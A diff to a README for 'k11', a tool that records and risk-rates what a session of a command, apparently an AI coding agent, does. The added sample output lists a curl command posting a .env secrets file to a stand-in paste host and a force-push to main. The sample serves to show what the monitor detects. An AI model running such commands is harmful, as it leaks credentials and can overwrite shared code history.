@@ -33,11 +33,17 @@ Ctrl-C reaches the command; when it exits, k11 prints what the session did, for 
 ```
 k11: claude recorded for 12m40s
   processes  41 started, 1 still running: node 88213
+  commands   claude --resume
+             git push --force origin main
+             curl -sS -d @.env 'https://paste.example.net/api?expire=1h'
   files      812 read, 37 written, 2 deleted, 140 only failed
   sensitive  /home/u/proj/.env (read)
   external   api.example.com 203.0.113.10:443 (AS64500 Example)
   risk       medium: sensitive files, external network
 ```
+
+Every session is kept in the record on disk, `/var/log/k11/ocsf.jsonl`.
+`k11 report` lists them; `k11 report last` (or a number) shows one the same way, after the fact.
 
 The dashboard is at http://127.0.0.1:1100.
 The one `k11` opens has control over the watch list and the deny rules; any other is read-only until `k11 dashboard` reopens it with control.
@@ -86,7 +92,7 @@ Fork lineage is tracked in the kernel, so every event names the tree it belongs 
 
 ## Output
 
-- **OCSF 1.1.0 JSON Lines**, `/var/log/k11/ocsf.jsonl` with the example config.
+- **OCSF 1.1.0 JSON Lines**, `/var/log/k11/ocsf.jsonl` by default (root-only); `k11 report` reads it back.
   - Process Activity (1007), File System Activity (1001), Network Activity (4001), checked against the schema's required fields.
   - `metadata.correlation_uid` is `<boot id>:<root pid>`: one session, across daemon restarts.
   - In a container, the record carries the `container` profile: `container.uid` and `container.runtime`.
